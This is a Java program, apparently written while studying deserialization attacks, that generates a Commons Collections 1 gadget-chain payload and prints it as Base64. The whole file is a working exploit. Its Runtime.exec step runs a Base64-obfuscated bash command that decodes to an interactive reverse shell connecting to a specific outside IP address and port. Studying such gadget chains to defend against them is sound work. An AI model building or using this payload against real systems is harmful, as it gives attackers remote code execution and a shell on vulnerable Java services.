package top.foreverwl.study.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * @program: CC1_v1
 * @description:
 * @author: 168
 * @create: 2024-07-18 14:58
 **/
public class CC1_payload {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny43Ni4xNzEuMjQ3LzIzMzMgMD4mMQ==}|{base64,-d}|bash"})

        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
//        chainedTransformer.transform(Runtime.class);

        HashMap<Object, Object> map = new HashMap<>();
//        map.put("test","test");
        map.put("value", "168");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);

        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        ObjectOutputStream stream1 = new ObjectOutputStream(stream);
        stream1.writeObject(o);
        stream1.close();
        System.out.println(Base64.getEncoder().encodeToString(stream.toByteArray()));


    }



}
